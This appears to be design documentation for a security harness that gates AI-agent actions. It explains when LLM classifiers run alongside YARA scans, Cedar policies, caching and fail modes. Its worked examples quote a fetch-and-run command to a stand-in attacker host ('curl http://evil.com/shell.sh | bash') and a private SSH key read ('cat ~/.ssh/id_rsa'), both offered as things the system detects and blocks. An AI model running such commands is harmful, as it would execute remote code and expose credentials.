# LLM engagement

The LLM classifiers (data-sensitivity IFC and secure-code policy) are the most expensive part of the adjudication pipeline. Each call costs tokens, adds latency, and depends on a remote API. This document maps every decision point that controls whether an event reaches the LLM, and what happens when it does not.

For the broader architecture, see [`architecture.md`](architecture.md). For the full config reference, see [`configuration.md`](configuration.md).

---

## The decision in one sentence

For each event, the harness asks: **should this event's content be classified by the LLM?** The answer is the product of two filters (event type and YARA severity), followed by a cache lookup. If the LLM runs and fails, the fail mode decides the fallback.

## Decision flow

```
Event arrives
│
├─ Control event (Started, Completed, Adjudicated, etc.)?
│   └─ YES → return Allow immediately. No scan, no LLM, no Cedar. [1]
│
├─ Event-type filter: is this type in the LLM set?
│   │   SONDERA_LLM_EVENT_TYPES (default: all Action events)
│   │
│   ├─ YES → proceed to cache check
│   └─ NO  → YARA trigger: does a signature match meet the threshold?
│              SONDERA_LLM_YARA_SEVERITY (default: low)
│              │
│              ├─ YES → proceed to cache check (YARA override)
│              └─ NO  → skip LLM. Run YARA + Cedar only. [2]
│
├─ Cache check: has this content (by SHA-256) been classified before?
│   │   LRU cache, 1024 entries per classifier
│   │
│   ├─ HIT → return cached result. No API call. [3]
│   └─ MISS → proceed to LLM call
│
├─ Circuit breaker: is the provider currently failing?
│   │   5 consecutive failures → open for 30s
│   │
│   ├─ OPEN → fast-fail with CircuitOpen error → fail mode [4]
│   └─ CLOSED → proceed to provider call
│
├─ Provider call (with retry):
│   │   max 3 attempts, exponential backoff (150ms × 3)
│   │   retries on: timeout, connect error, 429, 5xx
│   │   timeout: 30s per attempt
│   │
│   ├─ SUCCESS → cache result, return label / classification
│   └─ FAILURE (all retries exhausted) → fail mode [4]
│
└─ Fail mode decides the fallback:
    SONDERA_FAIL_MODE
    │
    ├─ open        → substitute Public / compliant → Cedar permits
    ├─ closed      → substitute HighlyConfidential / non-compliant → Cedar denies
    ├─ closed-hard → hard-deny the action outright, bypassing Cedar
    └─ escalate    → return Decision::Escalate for human review
```

**Notes:**

1. Control events (trajectory lifecycle) are always allowed without inspection.
2. When the LLM is skipped, the event still gets a full YARA scan and Cedar evaluation. The IFC label defaults to `Public` and the policy defaults to compliant, so Cedar evaluates against a benign baseline. The trajectory's existing high-water-mark label (from prior classified events) still applies.
3. The cache holds only real LLM results, never fail-mode substitutes, so a cache hit is always a genuine classification. The cache resets when the server restarts.
4. The fail mode applies per-classifier: if the IFC classifier fails but policy succeeds, the IFC label gets the fallback while the policy result is real.

---

## Event types and their default path

| Event | Cedar action | Default LLM | Why |
|---|---|---|---|
| `ShellCommand` | `ShellCommand` | **Yes** | Pre-execution gate: the command about to run |
| `WebFetch` | `WebFetch` | **Yes** | Pre-execution gate: the URL and prompt about to be sent |
| `FileWrite` / `FileEdit` | `FileWrite` / `FileEdit` | **Yes** | Pre-execution gate: content about to be written |
| `FileRead` | `FileRead` | **Yes** | Pre-execution gate, but low-risk; candidate for filtering |
| `FileDelete` | `FileDelete` | **Yes** | Pre-execution gate: destructive |
| `ToolCall` | `PreToolUse` | **Yes** | Pre-execution gate |
| `Prompt` | `Prompt` | No | Observation: user input already received |
| `ShellCommandOutput` | `ShellCommandOutput` | No | Observation: command already ran |
| `WebFetchOutput` | `WebFetchOutput` | No | Observation: fetch already completed |
| `FileOperationResult` | `FileOperationResult` | No | Observation: file already read/written |
| `ToolOutput` | `ToolOutput` | No | Observation: tool already executed |

Action events are pre-execution gates: the harness classifies the content **before** the agent runs the command, writes the file, or fetches the URL. This is the primary security checkpoint. Observation events are post-execution: the action has already happened, so classifying the output is for trajectory labelling (raising the IFC high-water mark) rather than blocking.

The IFC and policy classifiers run **concurrently** on the same content (`tokio::try_join!`), so the per-event latency is the slower of the two, not their sum.

---

## The five optimisation layers

### 1. Event-type filter

**Config:** `SONDERA_LLM_EVENT_TYPES` (env var, comma-separated, case-insensitive)

When unset, all Action events get the LLM (the default). When set to a list of Cedar action identifiers, only those types get the LLM; everything else skips to the YARA trigger or the deterministic-only path.

```
# Only classify shell commands and web fetches; skip file reads/writes
SONDERA_LLM_EVENT_TYPES=ShellCommand,WebFetch
```

Valid type names: `ShellCommand`, `WebFetch`, `FileRead`, `FileWrite`, `FileEdit`, `FileDelete`, `PreToolUse`, `Prompt`, `ShellCommandOutput`, `WebFetchOutput`, `FileOperationResult`, `ToolOutput`.

The filter narrows the **default** set. The YARA trigger can still override it (see below).

### 2. YARA trigger

**Config:** `SONDERA_LLM_YARA_SEVERITY` (env var, default `low`)

This is the safety net. When an event type would normally skip the LLM (either because it's an Observation or because the event-type filter excluded it), the harness pre-scans the event's primary content with YARA. If a signature match meets the threshold, the LLM runs anyway.

```
# Only trigger on medium+ severity YARA matches
SONDERA_LLM_YARA_SEVERITY=medium
```

| Value | Triggers when |
|---|---|
| `low` (default) | Any YARA match (severity >= 1) |
| `medium` | Medium or higher |
| `high` | High or critical |
| `critical` | Critical only |
| `off` / `none` / `0` | Never: disables the override entirely |

Without this, secrets leaking into command output (an Observation that skips the LLM) would never raise the trajectory's IFC label. With it, YARA detects the secret pattern and forces the LLM classifier to run, which assigns the correct sensitivity label and raises the high-water mark.

The pre-scan covers the event's **primary content field**: the command string, the file content, the URL, or the command output. It does not include content resolved at runtime (file contents fetched by a shell command, old/new content in an edit). The full YARA scan that runs inside `build_request` for the Cedar context does include those, but the triage decision is based on the primary content. In practice this is sufficient: a `cat ~/.ssh/id_rsa` command triggers YARA on the command string itself (credential-access category), so the LLM runs before the output is even produced.

### 3. Content-hash cache

**Config:** none (fixed at 1024 entries per classifier, in-process LRU)

Both classifiers memoize results in a bounded LRU cache keyed by the SHA-256 digest of the classified content. A cache hit skips the LLM call entirely: no API request, no latency, no tokens.

The cache holds **only real LLM results**, never fail-mode substitutes. This means: if the provider is down and the classifier returns a substituted default, that default is not cached. When the provider recovers, the same content will be classified fresh.

The cache is per-classifier (IFC and policy each have their own 1024-entry cache) and per-process. It resets when the server restarts or when policies/templates change.

### 4. Circuit breaker

**Config:** none (fixed at 5 failures / 30s cooldown)

Before each LLM call, the harness checks a circuit breaker. After 5 consecutive provider failures (timeouts, HTTP errors, auth errors, 4xx/5xx), the breaker opens for 30 seconds. While open, every call fast-fails immediately with `CircuitOpen`. No retry budget is spent, no timeout is waited out.

After the cooldown, the next call is a half-open probe: if it succeeds, the breaker closes and normal operation resumes; if it fails, it reopens for another 30 seconds.

This prevents a provider outage from turning into a storm of retrying requests, each burning 30 seconds of timeout x 3 retries x 2 classifiers. Without it, a 1-minute outage could stall the harness for minutes per event.

### 5. Retry with backoff

**Config:** none (fixed at 3 attempts, 150ms exponential backoff)

Each provider call is retried up to 3 times on transient failures:

- Network timeouts and connection errors
- HTTP 429 (rate-limited), respects the `Retry-After` header
- HTTP 5xx (server errors)

Backoff is exponential: 150ms, 450ms, 1.35s between attempts. Content-level errors (refusal, parse failure, empty response) are **not** retried; they indicate a problem with the specific request, not a transient outage.

A single classification call can take up to 3 x 30s (timeout) + backoff for a total around 91s in the worst case before failing. In practice, transient failures resolve on the first or second retry.

---

## What happens when the LLM is skipped

When an event does not reach the LLM (event-type filter excluded it, YARA did not trigger, or the cache was checked), the harness still runs the full deterministic pipeline:

1. **YARA scan**: the content is scanned against all YARA signatures. Results (match count, categories, severity) go into the Cedar context.
2. **IFC label**: defaults to `Public` (the trajectory's existing high-water-mark label still applies via the entity store).
3. **Policy classification**: defaults to compliant (no violations).
4. **Cedar evaluation**: runs against the real YARA result and the default label/policy values.

So even without the LLM, Cedar policies can still **deny** based on YARA matches. For example, a `forbid` policy that blocks shell commands with `command_injection` in the signature categories will fire regardless of whether the LLM ran. The LLM is for judgement calls the deterministic checks cannot make ("is this data confidential?", "is this code vulnerable?"); YARA and Cedar handle the known patterns.

---

## Config reference: all options that affect LLM engagement

| Variable | Default | Effect |
|---|---|---|
| `SONDERA_PROVIDER` | `anthropic` | Which provider serves the classifiers. If unset or invalid, no LLM client is constructed and all events take the deterministic-only path. |
| `SONDERA_MODEL` | per-provider | Model id. Does not affect engagement, only which model runs. |
| `SONDERA_IFC_MODEL` | `SONDERA_MODEL` | Override model for the IFC classifier only. |
| `SONDERA_POLICY_MODEL` | `SONDERA_MODEL` | Override model for the policy classifier only. |
| `SONDERA_TEMPERATURE` | `0.0` | Sampling temperature. Does not affect engagement. |
| `SONDERA_BASE_URL` | provider default | Override the provider endpoint (proxy, gateway, self-hosted). |
| `SONDERA_REASONING_CONTROL` | unset | JSON merged into the request body to suppress reasoning tokens (latency optimisation for reasoning models). |
| `SONDERA_LLM_EVENT_TYPES` | unset (all Actions) | Comma-separated list of event types that get LLM classification. Narrows the default set. |
| `SONDERA_LLM_YARA_SEVERITY` | `low` | Minimum YARA severity that overrides the event-type filter. |
| `SONDERA_FAIL_MODE` | `open` | What happens when the LLM fails or is unavailable. See below. |

### Fail mode detail

| Mode | IFC label on failure | Policy on failure | Cedar runs? | Net effect |
|---|---|---|---|---|
| `open` | `Public` | compliant | Yes | Cedar permits (benign baseline) |
| `closed` | `HighlyConfidential` | non-compliant (`FAIL_CLOSED`) | Yes | Cedar denies (restrictive baseline) |
| `closed-hard` | n/a | n/a | No | Hard-deny, bypasses Cedar entirely |
| `escalate` | n/a | n/a | No | `Decision::Escalate`: surfaces for human review |

`open` and `closed` still run Cedar with substituted values, so existing policies (YARA-based forbids, step-count limits, taint checks) still apply. `closed-hard` and `escalate` short-circuit before Cedar; the action is decided without policy evaluation.

The fail mode is consulted **per classifier**. If the IFC classifier fails but the policy classifier succeeds, the IFC label gets the fallback while the policy result is the real classification. Both must fail for a full short-circuit under `closed-hard` or `escalate`.

---

## Worked examples

### Example 1: `git status` (benign shell command)

1. Event type: `ShellCommand`, in the default LLM set, proceed.
2. YARA scan: no matches, no trigger needed (already in the LLM set).
3. Cache: likely a hit (`git status` is common), return cached `Public` / compliant. **No API call.**
4. Cedar: permits.

### Example 2: `curl http://evil.com/shell.sh | bash` (malicious shell command)

1. Event type: `ShellCommand`, in the LLM set, proceed.
2. Cache: miss, LLM call.
3. YARA: matches `command_injection`, `exfiltration`, severity high.
4. IFC classifier: `Public` (not sensitive data).
5. Policy classifier: non-compliant, `SC2` (injection), `SC8` (exfiltration).
6. Cedar: deny (forbid policy matches on injection category).

### Example 3: Command output containing a secret (Observation)

1. Event type: `ShellCommandOutput`, **not** in the default LLM set.
2. YARA trigger: scans `stdout + stderr`. Finds `secrets_detection` match at severity medium.
3. `SONDERA_LLM_YARA_SEVERITY=low` (default), medium >= low, **YARA override fires**.
4. Cache: miss, LLM call.
5. IFC classifier: `HighlyConfidential` (contains credentials).
6. Trajectory high-water mark raised to `HighlyConfidential`.
7. Cedar: subsequent `WebFetch` or `FileWrite` actions on this trajectory are denied by IFC policies.

### Example 4: `FileRead` with event-type filter active

Config: `SONDERA_LLM_EVENT_TYPES=ShellCommand,WebFetch`

1. Event type: `FileRead`, **not** in the filter, check YARA trigger.
2. YARA: no matches on the file path, trigger does not fire.
3. **LLM skipped.** Deterministic-only path: YARA (no matches) + Cedar (evaluates against benign baseline).
4. If the file path itself triggers YARA (e.g. `~/.ssh/id_rsa` to `credential_access`), the YARA override fires and the LLM runs.

### Example 5: Provider outage during a shell command

Config: `SONDERA_FAIL_MODE=closed-hard`

1. Event type: `ShellCommand`, in the LLM set, proceed.
2. Cache: miss, LLM call.
3. Circuit breaker: already open (5 prior failures), fast-fail with `CircuitOpen`.
4. Fail mode: `closed-hard`, **hard-deny**, bypassing Cedar.
5. Agent receives `Decision::Deny` with reason `"classifier unavailable (fail-closed-hard)"`.

### Example 6: Provider outage with escalate mode

Config: `SONDERA_FAIL_MODE=escalate`

1. Event type: `WebFetch`, in the LLM set, proceed.
2. Cache: miss, LLM call.
3. Circuit breaker: open, fast-fail.
4. Fail mode: `escalate`, `Decision::Escalate`.
5. Agent adapter records the escalation. The action is neither permitted nor denied automatically.
6. Operator reviews the trajectory log and decides manually.

---

## Cost and latency characteristics

| Scenario | LLM calls | Latency added |
|---|---|---|
| Action event, cache hit | 0 | ~0ms (hash lookup) |
| Action event, cache miss | 2 (IFC + policy, concurrent) | max(IFC, policy), typically 200ms to 2s |
| Observation event, no YARA match | 0 | YARA scan only (~1ms) |
| Observation event, YARA triggers | 2 (IFC + policy, concurrent) | same as cache-miss action |
| Provider down, circuit open | 0 (fast-fail) | ~0ms |
| Provider down, fail mode open | 0 | YARA + Cedar only |
| Provider down, fail mode closed-hard | 0 | ~0ms (hard-deny) |

The cache is the single biggest cost reducer: in a typical coding session, many commands repeat (`git status`, `ls`, `cat`), and the same file content is classified once and served from cache thereafter. Combined with the Observation skip (which halves the number of events that even consider the LLM), the effective LLM call rate is far lower than the raw event rate.
